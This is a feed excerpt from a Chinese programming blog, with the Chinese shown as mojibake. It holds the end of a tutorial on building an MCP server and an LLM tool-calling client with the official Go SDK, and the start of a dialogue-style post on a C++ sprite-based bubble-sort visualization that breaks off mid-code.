	Fstype     string   `json:"fstype" jsonschema:"the filesystem type"`
	Opts       []string `json:"opts" jsonschema:"the mount options"`
	DiskTotal  uint64   `json:"disk_total" jsonschema:"the total disk space in GiB"`
	DiskUsage  float64  `json:"disk_usage" jsonschema:"the disk usage percentage"`
}

type GetDiskInfoOut struct {
	PartInfos []DiskInfo `json:"part_infos" jsonschema:"the disk partitions"`
}

func getDiskInfo(ctx context.Context, req *mcp.CallToolRequest, args any) (*mcp.CallToolResult, GetDiskInfoOut, error) {
	partInfos, err := disk.Partitions(false)
	if err != nil {
		return nil, GetDiskInfoOut{}, err
	}

	var resp []DiskInfo
	for _, part := range partInfos {
		diskUsage, err := disk.Usage(part.Mountpoint)
		if err != nil {
			continue
		}
		resp = append(resp, DiskInfo{
			Device:     part.Device,
			Mountpoint: part.Mountpoint,
			Fstype:     part.Fstype,
			Opts:       part.Opts,
			DiskTotal:  diskUsage.Total / 1024 / 1024 / 1024,
			DiskUsage:  diskUsage.UsedPercent,
		})
	}
	return nil, GetDiskInfoOut{PartInfos: resp}, nil
}

func main() {
	// ctx := context.Background()

	server := mcp.NewServer(&amp;mcp.Implementation{Name: "MCP_Demo", Version: "0.0.1"}, &amp;mcp.ServerOptions{
		Instructions: "æ¥ææ¶é´ç¸å³ç Server",
	})
	mcp.AddTool(server, &amp;mcp.Tool{
		Name:        "get_current_datetime",
		Description: "Get current datetime in RFC3339 format",
	}, getCurrentDatetime)

	mcp.AddTool(server, &amp;mcp.Tool{
		Name:        "get_computer_status",
		Description: "Get computer status",
	}, getComputerStatus)

	mcp.AddTool(server, &amp;mcp.Tool{
		Name:        "get_disk_info",
		Description: "Get disk information",
	}, getDiskInfo)

	// if err := server.Run(ctx, &amp;mcp.StdioTransport{}); err != nil {
	// 	log.Fatalln(err)
	// }
	//
	handler := mcp.NewStreamableHTTPHandler(func(req *http.Request) *mcp.Server {
		path := req.URL.Path
		switch path {
		case "/api/mcp":
			return server
		default:
			return nil
		}
	}, nil)
	url := "127.0.0.1:18001"
	if err := http.ListenAndServe(url, handler); err != nil {
		log.Fatalln(err)
	}
}
</code></pre>
<p>MCP Server ä»£ç ç¼è¯éè¿åï¼å¯ä»¥å¨æ¯æ MCP åè®®çå¼åå·¥å·ï¼å¦ VS Codeï¼ä¸­è¿è¡æµè¯éªè¯ãä»¥ä¸æ¯ä¸ä¸ªå¸åç <code>.vscode/mcp.json</code> éç½®ç¤ºä¾ï¼</p>
<pre><code class="language-json">{
    "servers": {
        "demo-http": {
            // "command": "/home/rainux/Documents/workspace/go-dev/mcp-dev/mcp-server-dev/mcp-server-dev"
            "type": "http",
            "url": "http://127.0.0.1:18001/api/mcp"
        }
    }
}
</code></pre>
<p>å¯å¨ MCP Server åï¼å¯ä»¥éè¿å LLM æåºç¸å³é®é¢æ¥éªè¯å·¥å·æ¯å¦è½å¤è¢«æ­£ç¡®è°åº¦åæ§è¡ã</p>
<h2 id="ä¸ä¸ªå®æ´ç-mcp-client-å®ç°">ä¸ä¸ªå®æ´ç MCP Client å®ç°</h2>
<p>ä¸ºäºæå»ºç«¯å°ç«¯ç MCP åºç¨ï¼æä»¬è¿éè¦å®ç°ä¸ä¸ª MCP Clientï¼ä½¿å¶è½å¤ä¸ LLM ååå·¥ä½ï¼èªå¨éæ©å¹¶è°ç¨åéçå·¥å·ãä»¥ä¸æ¯ä¸ä¸ªåè½å®æ´ç MCP Client å®ç°ï¼å¶ä¸­åå«äºä¸ OpenAI å¼å®¹ API çéæç¤ºä¾ï¼<code>callOpenAI</code> å½æ°ï¼ã</p>
<pre><code class="language-go">package main

import (
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os/exec"
	"time"

	"github.com/modelcontextprotocol/go-sdk/mcp"
	"github.com/openai/openai-go/v3"
	"github.com/openai/openai-go/v3/option"
	"github.com/openai/openai-go/v3/packages/param"
)

var (
	FLAG_ModelName     string
	FLAG_BaseURL       string
	FLAG_APIKEY        string
	FLAG_MCP_TRANSPORT string
	FLAG_MCP_URI       string
	FLAG_QUESTION      string
	FLAG_STREAM        bool
)

func main() {
	// Parse command-line flags
	flag.StringVar(&amp;FLAG_BaseURL, "base-url", "https://dashscope.aliyuncs.com/compatible-mode/v1", "llm base url")
	flag.StringVar(&amp;FLAG_ModelName, "model", "qwen-plus", "LLM Model Name")
	flag.StringVar(&amp;FLAG_MCP_TRANSPORT, "mcp-transport", "http", "MCP transport protocol (stdio or http)")
	flag.StringVar(&amp;FLAG_MCP_URI, "mcp-uri", "", "MCP server address")
	flag.StringVar(&amp;FLAG_APIKEY, "api-key", "", "llm api key")
	flag.StringVar(&amp;FLAG_QUESTION, "q", "Hi", "question")
	flag.BoolVar(&amp;FLAG_STREAM, "s", false, "stream response")

	flag.Parse()

	// Get configuration from environment variables with flag overrides
	if FLAG_APIKEY == "" {
		log.Fatalln("api key is empty")
	}

	if FLAG_QUESTION == "" {
		log.Fatalln("question is empty")
	}

	// Configure OpenAI client
	// config :=
	ctx := context.Background()

	// question := "Write me a haiku about computers"
	if FLAG_MCP_URI != "" {
		callOpenAIWithTools(ctx, FLAG_QUESTION)
	} else {
		callOpenAI(ctx, FLAG_QUESTION, FLAG_STREAM)
	}
}

// callOpenAI è°ç¨ OpenAI API æ¥å£å¤çç¨æ·é®é¢
// è¯¥å½æ°æ¯ææµå¼ï¼streamï¼åéæµå¼ï¼non-streamï¼ä¸¤ç§ååºæ¹å¼
//
// åæ°:
//   - ctx: æ§å¶æä½çå½å¨æçä¸ä¸æ
//   - question: ç¨æ·æåºçé®é¢å­ç¬¦ä¸²
//   - stream: å¸å°å¼ï¼æå®æ¯å¦ä½¿ç¨æµå¼ååº
func callOpenAI(ctx context.Context, question string, stream bool) {
	client := openai.NewClient(option.WithAPIKey(FLAG_APIKEY), option.WithBaseURL(FLAG_BaseURL))
	systemPrompt := "è¯·ç¨äº²åç­æçé£æ ¼åç­ç¨æ·çé®é¢"

	if stream {
		// åå»ºæµå¼ååºè¯·æ±
		streamResp := client.Chat.Completions.NewStreaming(ctx, openai.ChatCompletionNewParams{
			Messages: []openai.ChatCompletionMessageParamUnion{
				openai.SystemMessage(systemPrompt),
				openai.UserMessage(question),
			},
			Model: FLAG_ModelName,
		})
		// defer streamResp.Close()
		defer func() {
			err := streamResp.Close()
			if err != nil {
				log.Fatalln(err)
			}
		}()
		// éåæµå¼ååºå¹¶éåè¾åºåå®¹
		for streamResp.Next() {
			data := streamResp.Current()
			fmt.Print(data.Choices[0].Delta.Content)

			if err := streamResp.Err(); err != nil {
				log.Fatalln(err)
			}
		}

	} else {
		// åå»ºéæµå¼ååºè¯·æ±
		chatCompletion, err := client.Chat.Completions.New(ctx, openai.ChatCompletionNewParams{
			Messages: []openai.ChatCompletionMessageParamUnion{
				openai.SystemMessage(systemPrompt),
				openai.UserMessage(question),
			},
			Model: FLAG_ModelName,
		})
		if err != nil {
			log.Fatalln(err)
		}
		// è¾åºéæµå¼ååºåå®¹
		fmt.Println(chatCompletion.Choices[0].Message.Content)
	}
}

// callOpenAIWithTools ä½¿ç¨ OpenAI API å MCP å·¥å·è°ç¨æ¥å¤çç¨æ·é®é¢
// è¯¥å½æ°åå»ºä¸ä¸ª OpenAI å®¢æ·ç«¯å MCP å®¢æ·ç«¯ï¼å° MCP å·¥å·è½¬æ¢ä¸º OpenAI å¯ä½¿ç¨çæ ¼å¼ï¼
// å¹¶æ§è¡å®æ´çå·¥å·è°ç¨æµç¨ï¼åæ¬åå§è°ç¨åå¯è½çåç»­è°ç¨
//
// åæ°:
//   - ctx: æ§å¶æä½çå½å¨æçä¸ä¸æ
//   - question: ç¨æ·æåºçé®é¢å­ç¬¦ä¸²
func callOpenAIWithTools(ctx context.Context, question string) {
	// åå»º OpenAI å®¢æ·ç«¯ï¼ä½¿ç¨ API å¯é¥ååºç¡ URL éç½®
	llmClient := openai.NewClient(option.WithAPIKey(FLAG_APIKEY), option.WithBaseURL(FLAG_BaseURL))
	// åå»º MCP å®¢æ·ç«¯ï¼æå®åç§°åçæ¬
	mcpClient := mcp.NewClient(&amp;mcp.Implementation{Name: "mcp-client", Version: "0.0.1"}, nil)
	var transport mcp.Transport
	// æ ¹æ®å½ä»¤è¡æ å¿éæ©ä¼ è¾åè®®ï¼stdio æ httpï¼
	switch FLAG_MCP_TRANSPORT {
	case "stdio":
		transport = &amp;mcp.CommandTransport{Command: exec.Command(FLAG_MCP_URI)}
	case "http":
		transport = &amp;mcp.StreamableClientTransport{HTTPClient: &amp;http.Client{Timeout: time.Second * 10}, Endpoint: FLAG_MCP_URI}
	default:
		log.Fatalf("unknown transport, %s", FLAG_MCP_TRANSPORT)
	}
	// å»ºç«ä¸ MCP æå¡å¨çè¿æ¥
	session, err := mcpClient.Connect(ctx, transport, nil)
	if err != nil {
		log.Fatalf("MCP client connects to mcp server failed, err: %v", err)
	}
	defer func() {
		err := session.Close()
		if err != nil {
			log.Fatalln(err)
		}
	}()

	// è·åå¯ç¨ç MCP å·¥å·åè¡¨
	mcpTools, err := session.ListTools(ctx, &amp;mcp.ListToolsParams{})
	if err != nil {
		log.Fatalf("List mcp tools failed, err: %v", err)
	}

	var legacyTools []openai.ChatCompletionToolUnionParam
	// éåææ MCP å·¥å·å¹¶å°å¶è½¬æ¢ä¸º OpenAI å¼å®¹çå·¥å·æ ¼å¼
	for _, tool := range mcpTools.Tools {
		// å° MCP å·¥å·è¾å¥æ¨¡å¼è½¬æ¢ä¸º OpenAI å½æ°åæ°
		if inputSchema, ok := tool.InputSchema.(map[string]any); ok {
			legacyTools = append(legacyTools, openai.ChatCompletionFunctionTool(
				openai.FunctionDefinitionParam{
					Name:        tool.Name,
					Description: openai.String(tool.Description),
					Parameters:  openai.FunctionParameters(inputSchema),
				},
			))
		} else {
			// å¦æ InputSchema ä¸æ¯ map[string]anyï¼ä½¿ç¨ç©ºåæ°
			legacyTools = append(legacyTools, openai.ChatCompletionFunctionTool(
				openai.FunctionDefinitionParam{
					Name:        tool.Name,
					Description: openai.String(tool.Description),
					Parameters:  openai.FunctionParameters{},
				},
			))
		}
	}

	// è®¾ç½®åå§èå¤©æ¶æ¯ï¼åæ¬ç³»ç»æç¤ºåç¨æ·é®é¢
	messages := []openai.ChatCompletionMessageParamUnion{
		openai.SystemMessage("è¯·ç¨äº²åç­æçé£æ ¼åç­ç¨æ·çé®é¢ãä½ å¯ä»¥ä½¿ç¨å¯ç¨çå·¥å·æ¥è·åä¿¡æ¯ã"),
		openai.UserMessage(question),
	}

	// è°ç¨ LLM è·ååæ­¥ååº
	chatCompletion, err := llmClient.Chat.Completions.New(ctx, openai.ChatCompletionNewParams{
		Messages: messages,
		Model:    FLAG_ModelName,
		Tools:    legacyTools,
		ToolChoice: openai.ChatCompletionToolChoiceOptionUnionParam{
			OfAuto: param.Opt[string]{
				Value: "auto",
			},
		},
	})
	if err != nil {
		log.Fatalf("LLM call failed, err: %v", err)
	}

	choice := chatCompletion.Choices[0]
	fmt.Printf("LLM response: %s\n", choice.Message.Content)

	// æ£æ¥æ¯å¦éè¦è°ç¨å·¥å·
	if choice.FinishReason == "tool_calls" &amp;&amp; len(choice.Message.ToolCalls) &gt; 0 {
		// éåææéè¦è°ç¨çå·¥å·
		for _, toolCall := range choice.Message.ToolCalls {
			if toolCall.Type != "function" {
				continue
			}

			fmt.Printf("Executing tool: %s with args: %s\n", toolCall.Function.Name, toolCall.Function.Arguments)

			// è§£æ JSON åæ°
			var argsObj map[string]any
			args := toolCall.Function.Arguments

			if args != "" {
				if err := json.Unmarshal([]byte(args), &amp;argsObj); err != nil {
					log.Printf("Failed to parse tool arguments: %v", err)
					argsObj = make(map[string]any)
				}
			} else {
				argsObj = make(map[string]any)
			}

			fmt.Printf("Executing tool: %s with parsed args: %v\n", toolCall.Function.Name, argsObj)

			// æ§è¡ MCP å·¥å·è°ç¨
			result, err := session.CallTool(ctx, &amp;mcp.CallToolParams{
				Name:      toolCall.Function.Name,
				Arguments: argsObj,
			})
			if err != nil {
				log.Printf("Tool call failed: %v", err)
				continue
			}

			// å° MCP åå®¹è½¬æ¢ä¸ºå­ç¬¦ä¸²
			var toolResult string
			if len(result.Content) &gt; 0 {
				if textContent, ok := result.Content[0].(*mcp.TextContent); ok {
					toolResult = textContent.Text
				} else {
					// å¦æä¸æ¯ TextContentï¼è½¬æ¢ä¸º JSON
					if jsonBytes, err := json.Marshal(result.Content[0]); err == nil {
						toolResult = string(jsonBytes)
					} else {
						toolResult = "Tool executed successfully"
					}
				}
			}

			fmt.Printf("Tool result: %s\n", toolResult)

			// æ·»å å·¥å·è°ç¨æ¶æ¯åå·¥å·ååºæ¶æ¯
			messages = append(messages, openai.ChatCompletionMessageParamUnion{
				OfAssistant: &amp;openai.ChatCompletionAssistantMessageParam{
					Role: "assistant",
					ToolCalls: []openai.ChatCompletionMessageToolCallUnionParam{
						{
							OfFunction: &amp;openai.ChatCompletionMessageFunctionToolCallParam{
								ID: toolCall.ID,
								Function: openai.ChatCompletionMessageFunctionToolCallFunctionParam{
									Name:      toolCall.Function.Name,
									Arguments: toolCall.Function.Arguments,
								},
							},
						},
					},
				},
			})

			messages = append(messages, openai.ToolMessage(
				toolResult,
				toolCall.ID,
			))

			// è¿è¡åç»­è°ç¨ä»¥è·å¾æç»ååº
			chatCompletion, err = llmClient.Chat.Completions.New(ctx, openai.ChatCompletionNewParams{
				Messages: messages,
				Model:    FLAG_ModelName,
			})
			if err != nil {
				log.Fatalf("LLM follow-up failed, err: %v", err)
			}

			fmt.Printf("Final response: %s\n", chatCompletion.Choices[0].Message.Content)
		}
	}
}
</code></pre>
<h3 id="è¿è¡æµè¯éªè¯">è¿è¡æµè¯éªè¯</h3>
<p>ç¼è¯å®æåï¼æä»¬å¯ä»¥è¿è¡å¤è½®æµè¯æ¥éªè¯åè½çæ­£ç¡®æ§ã</p>
<p><strong>æ®éé®ç­æµè¯</strong>ï¼</p>
<pre><code class="language-bash">./mcp-client-dev -api-key "sk-xxx" -q "how are you"
</code></pre>
<p>è¿å¯ä»¥å ä¸ <code>-s</code> åæ°å¯ç¨æµå¼è¾åºï¼</p>
<pre><code class="language-bash">./mcp-client-dev -api-key "sk-xxx" -q "how are you" -s
</code></pre>
<p>é¢æè¾åºï¼</p>
<pre><code>Hi there! ð I'm absolutely wonderfulâenergized, curious, and *so* happy to be chatting with you! ð How about you? I'd love to hear how your day's goingâor what's on your heart or mind right now! ð« (Bonus points if you share a fun fact, a tiny win, or even just your favorite emoji today! ð¦â¨)
</code></pre>
<p><strong>MCP å·¥å·è°ç¨æµè¯</strong>ï¼</p>
<pre><code class="language-bash">./mcp-client-dev -api-key "sk-xxx" -mcp-uri "http://127.0.0.1:18001/api/mcp" -q "å½åæ¶é´æ¯ä»ä¹"
</code></pre>
<p>é¢æè¾åºï¼</p>
<pre><code>LLM response: 
Executing tool: get_current_datetime with args: {}
Executing tool: get_current_datetime with parsed args: map[]
Tool result: "2026-02-02T23:12:54+08:00"
Final response: ç°å¨æ¯ **2026 å¹´ 2 æ 2 æ¥ æä¸ 11:12**ï¼åäº¬æ¶é´ï¼UTC+8ï¼â¨
æ°å¹´çæ°æ¯è¿ææçï½ä½ æ¯å¨è§åä»ä¹ç¹å«çäºæåï¼ð æå¾ä¹æå¸®ä½ å®æãæéæä¸èµ·çæ³å¦ï¼
</code></pre>
<h2 id="æä½³å®è·µä¸æ³¨æäºé¡¹">æä½³å®è·µä¸æ³¨æäºé¡¹</h2>
<p>å¨å®éé¡¹ç®ä¸­ä½¿ç¨ Go è¯­è¨å®ç° MCP Server æ¶ï¼å»ºè®®èèä»¥ä¸æä½³å®è·µï¼</p>
<ol>
<li><strong>éè¯¯å¤ç</strong>ï¼ç¡®ä¿ææå·¥å·å½æ°é½æå®åçéè¯¯å¤çæºå¶ï¼é¿åå åä¸ªå·¥å·å¤±è´¥å¯¼è´æ´ä¸ªæå¡å´©æºã</li>
<li><strong>æ§è½ä¼å</strong>ï¼å¯¹äºèæ¶è¾é¿çæä½ï¼å¦ç³»ç»ä¿¡æ¯ééï¼ï¼èèæ·»å è¶æ¶æ§å¶åç¼å­æºå¶ã(å¨MCPå®æ¹ææ¡£çå°æ Tasks å progress è¿ä¸¤ä¸ªæ°çåè¯­, èæ¶ä»»å¡ä¹å¯ä»¥è¯è¯è¿ä¸¤ä¸ª)</li>
<li><strong>å®å¨æ§</strong>ï¼éªè¯ææè¾å¥åæ°ï¼é²æ­¢æ¶æè¾å¥å¯¼è´çå®å¨é®é¢ãå¯¹äºæ¶åç³»ç»æä½çå·¥å·ï¼éè¦ç¹å«æ³¨ææéæ§å¶ã</li>
<li><strong>æ¥å¿è®°å½</strong>ï¼æ·»å è¯¦ç»çæ¥å¿è®°å½ï¼ä¾¿äºè°è¯åçæ§å·¥å·çä½¿ç¨æåµã</li>
<li><strong>éç½®ç®¡ç</strong>ï¼å°æå¡éç½®ï¼å¦çå¬å°åãç«¯å£ç­ï¼æåå°éç½®æä»¶ä¸­ï¼æé«å¯ç»´æ¤æ§ã</li>
</ol>
<h2 id="æ»ç»">æ»ç»</h2>
<p>æ¬æéè¿ä¸ä¸ªç®åçä»£ç ç¤ºä¾å±ç¤ºäºå¦ä½ä½¿ç¨ Go è¯­è¨å¼å MCP Server å Clientãè½ç¶ Go è¯­è¨å¨ MCP å¼åæ¹é¢ç¸æ¯ Python ç¥æ¾å¤æï¼ä½å¶å¨å¹¶åå¤çãæ§è½åé¨ç½²ä¾¿å©æ§æ¹é¢çä¼å¿ä½¿å¶æä¸ºçäº§ç¯å¢ççæ³éæ©ã</p>
<p>éè¦æ³¨æçæ¯ï¼æ¬æç¤ºä¾ä»æ¶µçäº MCP å·¥å·è°ç¨çåºæ¬åè½ãå¨å®éä¸å¡é¡¹ç®ä¸­ä½¿ç¨ Go è¯­è¨å®ç° MCP Server æ¶ï¼è¿éè¦æ·±å¥ç ç©¶ MCP åè®®çå¶ä»ç¹æ§ï¼å¦ Prompt ç®¡çãèº«ä»½è®¤è¯ï¼Authï¼ãä¼è¯ç®¡çç­é«çº§åè½çå®ç°æ¹æ¡ã</p>
<p>éè¿åççè®¾è®¡åå®ç°ï¼åºäº Go è¯­è¨ç MCP æå¡å¯ä»¥ä¸º AI åºç¨æä¾ç¨³å®ãé«æãå®å¨çå·¥å·è°ç¨è½åï¼åååæ¥ Go è¯­è¨å¨ç³»ç»ç¼ç¨åç½ç»æå¡æ¹é¢çä¼å¿ã</p>
<h2 id="åè">åè</h2>
<ul>
<li>MCP å®æ¹é¡µé¢: <a href="https://modelcontextprotocol.io/docs/getting-started/intro" target="_blank" rel="noopener nofollow">https://modelcontextprotocol.io/docs/getting-started/intro</a></li>
<li>MCP å®æ¹ Go SDK: <a href="https://github.com/modelcontextprotocol/go-sdk" target="_blank" rel="noopener nofollow">https://github.com/modelcontextprotocol/go-sdk</a></li>
</ul>


</div>
<div id="MySignature" role="contentinfo">
    <p>æ¬ææ¥èªåå®¢å­ï¼ä½èï¼<a href="https://www.cnblogs.com/XY-Heruo/" target="_blank">è±ééä½ç°</a>ï¼è½¬è½½è¯·æ³¨æåæé¾æ¥ï¼<a href="https://www.cnblogs.com/XY-Heruo/p/19566770" target="_blank">https://www.cnblogs.com/XY-Heruo/p/19566770</a></p>
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-03 00:02">2026-02-03 00:02</span>&nbsp;
<a href="https://www.cnblogs.com/XY-Heruo">è±ééä½ç°</a>&nbsp;
éè¯»(<span id="post_view_count">0</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19566770);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19566770', targetLink: 'https://www.cnblogs.com/XY-Heruo/p/19566770', title: 'MCPå®æ¹Go SDKå°é²' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ä¸ä¸ªææçç¼ç¨æå®¤ï¼çµèå±å¹ååçä¸ä½ç¨åºåï¼ä½ ï¼ï¼æè¾¹ç«çä¸ä½å¥½å¥çæåã ]]></title>
    <link>https://www.cnblogs.com/lixingqiu/p/19566285</link>
    <guid>9c7cf314fcd428f950ff05c27a8e2c93</guid>
    <description>
    <![CDATA[ 
	<h1 class="postTitle"><a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/lixingqiu/p/19566285" title="åå¸äº 2026-02-02 20:13">
    <span role="heading" aria-level="2">ä¸ä¸ªææçç¼ç¨æå®¤ï¼çµèå±å¹ååçä¸ä½ç¨åºåï¼ä½ ï¼ï¼æè¾¹ç«çä¸ä½å¥½å¥çæåã</span>
    

</a>
</h1>
	<div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<p><img alt="æ æ é¢" width="297" height="287" loading="lazy" data-src="https://img2024.cnblogs.com/blog/523461/202602/523461-20260202201328054-675354003.png" class="lazyload"></p>
<p>&nbsp;</p>
<p>å¯ä»¥åçè§é¢ï¼https://www.douyin.com/video/7602172380894563636</p>
<p>æåï¼âå¿ï¼ä¼è®¡ï¼ä½ å¨å¹²å¥å¢ï¼è¿å±å¹ä¸ä¸å å°çå¨å¨æ¥å¨å»çï¼æ¯å¥ç©æå¿ï¼â</p>
<p>ä½ ï¼æ¨äºæ¨ç¼éï¼ï¼âå¦ï¼è¿æ¯åæ³¡æåºçå¯è§åç¨åºãä½ ç¥éåæ³¡æåºåï¼â</p>
<p>æåï¼âå¬è¯´è¿ï¼ä½å·ä½ååäºæä¸å¤ªæ¸æ¥ãâ</p>
<p>ä½ ï¼âé£æå°±ç»ä½ è®²è®²ãå°±åè¿äºå°çä¸æ ·ï¼å®ä»¬ä¸å¼å§æ¯ä¹±åºçï¼æä»¬è¦æå®ä»¬ä»å°å°å¤§æå¥½ãâ</p>
<p>æåï¼âé£æä¹æå¢ï¼â</p>
<p>ä½ ï¼âå¾ç®åï¼å°±æ¯ä¸¤ä¸¤æ¯è¾ï¼å¦æåé¢çæ¯åé¢çå¤§ï¼å°±äº¤æ¢ä½ç½®ãå°±åè¿æ ·âââ</p>
<p>ï¼ä½ æçå±å¹ï¼</p>
<p>âä½ çï¼ç¬¬ä¸ä¸ªçº¢çåæ©çæ¯ï¼åç°çº¢çå¤§ï¼äºæ¯å®ä»¬äº¤æ¢ä½ç½®ï¼æ¥çæ©çåé»çæ¯â¦â¦â</p>
<p>æåï¼âå¦ï¼æç¹åæçæ¶çççæè§ãâ</p>
<p>ä½ ï¼âå¯¹å¯¹å¯¹ï¼å°±æ¯è¿ä¹ä¸ªææãæ¯ä¸è½®ä¸æ¥ï¼æå¤§çé£ä¸ªæ°å°±ä¼âæ²âå°æåé¢ï¼å°±åæ°æ³¡å¾ä¸åä¸æ ·ï¼æä»¥å«âåæ³¡æåºâãâ</p>
<p>æåï¼âé£è¿äºå°çä¸ºå¥ä¼å¨åï¼â</p>
<p>ä½ ï¼âå ä¸ºæä»¬ç¨äºC++ç²¾çµåºï¼æ¯ä¸ªå°çé½æ¯ä¸ä¸ªâSpriteâå¯¹è±¡ï¼æé¢è²ãå¤§å°ãä½ç½®ç­å±æ§ãæ¯æ¬¡äº¤æ¢çæ¶åï¼æä»¬ä¸ä»æ¢æ°æ®ï¼è¿è®©å®ä»¬çå¾åä¹è·çç§»å¨ãâ</p>
<p>æåï¼âåï¼è¿æºç´è§çãâ</p>
<p>ä½ ï¼âæ¯åï¼èä¸ä½ çä¸é¢è¿ææå­æç¤ºï¼è¯´ç°å¨æ¯ç¬¬å è½®ï¼æåè¿ä¼æ¾ç¤ºâæ¼ç¤ºå®æ¯ï¼ââ</p>
<p>æåï¼âé£è°åçè¿ä¸ªç¨åºåï¼â</p>
<p>ä½ ï¼å¾æå°ç¬ï¼ï¼âæå¸ç¥ââæå´çèå¸ãä»åäºè¿ä¸ªC++ç²¾çµåºï¼æ¹ä¾¿æä»¬åè¿ç§å¨ç»ææãâ</p>
<p>æåï¼âåå®³åï¼é£æè½ä¸è½ä¹è¯è¯ï¼â</p>
<p>ä½ ï¼âå½ç¶å¯ä»¥ï¼ä»£ç é½å¨è¿å¿å¢ï¼ä½ æ³æ¹å¤å°é½è¡ãâ</p>
<hr>
<div class="cnblogs_code">
<pre>#include <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">sprites.h</span><span style="color: rgba(128, 0, 0, 1)">"</span>  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">åå«C++ç²¾çµåº </span>
<span style="color: rgba(0, 0, 255, 1)">using</span> <span style="color: rgba(0, 0, 255, 1)">namespace</span><span style="color: rgba(0, 0, 0, 1)"> std;
Sprite rocket;      </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">å»ºç«è§è²å«rocket</span>
<span style="color: rgba(0, 0, 255, 1)">struct</span><span style="color: rgba(0, 0, 0, 1)"> Node{
   </span><span style="color: rgba(0, 0, 255, 1)">int</span> value,x;  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">å¼ååæ </span>
   Sprite *<span style="color: rgba(0, 0, 0, 1)">sp;
};
vector</span>&lt;Node *&gt;<span style="color: rgba(0, 0, 0, 1)"> datas;
vector</span>&lt;<span style="color: rgba(0, 0, 255, 1)">string</span>&gt; colors = {<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">red</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">orange</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">yellow</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">green</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">,
                         </span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">cyan</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">blue</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">purple</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">pink</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">};
</span><span style="color: rgba(0, 0, 255, 1)">void</span> swap(<span style="color: rgba(0, 0, 255, 1)">int</span> i,<span style="color: rgba(0, 0, 255, 1)">int</span> j){   <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">äº¤æ¢ä¸¤ä¸ªèç¹</span>
     Node *a =<span style="color: rgba(0, 0, 0, 1)"> datas[i];
     Node </span>*b =<span style="color: rgba(0, 0, 0, 1)"> datas[j];   
     </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">äº¤æ¢aåbçxä»æ ï¼å¹¶ä¸å°è¾¾èªå·±çåæ     </span>
     <span style="color: rgba(0, 0, 255, 1)">int</span> tempx = a-&gt;<span style="color: rgba(0, 0, 0, 1)">x;
     a</span>-&gt;x = b-&gt;<span style="color: rgba(0, 0, 0, 1)">x;
     b</span>-&gt;x =<span style="color: rgba(0, 0, 0, 1)"> tempx;
     a</span>-&gt;sp-&gt;go(a-&gt;x,<span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">);
     b</span>-&gt;sp-&gt;go(b-&gt;x,<span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">);
     </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">å¨datasä¸­çä½ç½®ä¹è¦äº¤æ¢</span>
     Node *<span style="color: rgba(0, 0, 0, 1)">temp ;   
     temp </span>=<span style="color: rgba(0, 0, 0, 1)"> datas[i];
     datas[i] </span>=<span style="color: rgba(0, 0, 0, 1)"> datas[j];
     datas[j] </span>=<span style="color: rgba(0, 0, 0, 1)"> temp;     
}
</span><span style="color: rgba(0, 0, 255, 1)">int</span> main(){        <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">ä¸»åè½å </span>
   g_screen-&gt;bgcolor(<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">black</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">);
   </span><span style="color: rgba(0, 0, 255, 1)">int</span> n= randint(<span style="color: rgba(128, 0, 128, 1)">5</span>,<span style="color: rgba(128, 0, 128, 1)">8</span><span style="color: rgba(0, 0, 0, 1)">);
   </span><span style="color: rgba(0, 0, 255, 1)">int</span> x = <span style="color: rgba(128, 0, 128, 1)">50</span>-<span style="color: rgba(128, 0, 128, 1)">100</span>*n/<span style="color: rgba(128, 0, 128, 1)">2</span>;    <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">æå·¦è¾¹èç¹åæ (èµ·å§)</span>
